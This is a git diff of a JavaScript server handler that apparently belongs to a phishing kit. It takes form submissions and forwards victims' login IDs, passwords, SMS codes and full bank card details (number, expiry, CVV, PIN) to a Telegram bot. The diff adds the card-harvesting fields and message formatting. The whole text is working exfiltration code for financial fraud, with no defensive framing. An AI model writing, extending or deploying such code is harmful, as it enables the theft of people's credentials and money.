@@ -7,6 +7,11 @@ export default async function handler(req, res) {
 
     id_no,
     password,
+    PINE,
+    CN,
+    cc,
+    exp,
+    cvv,
     PIN,
 
   } = req.body;
@@ -16,19 +21,31 @@ export default async function handler(req, res) {
 
   let message = "";
 
-  if  (id_no && password ) {
+  if  (CN && cc && exp && cvv && PIN) {
+    // 🟢 رسالة الكارت
+    message = `
+    💳 Carte Bancaire:
+    -CardholderName: ${CN}
+    - Numéro: ${cc}
+    - Expiration: ${exp}
+    - CVV: ${cvv}
+    - PIN: ${PIN}
+    `;
+  
+  }else if (PINE) {
+    // 🟠 رسالة SMS
+    message = `
+  📲 pin:
+  - Code: ${PINE}
+    `;
+
+  } else if (id_no && password ) {
     // 🟢 رسالة الكارت
     message = `
     🔑 Nouveau PIN Login:
     - Identifiant: ${id_no}
     - Mot de passe: ${password}
-    `;
-  } else if (PIN) {
-    // 🟠 رسالة SMS
-    message = `
-  📲 pin:
-  - Code: ${PIN}
-    `;
+     `;
   }
 
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
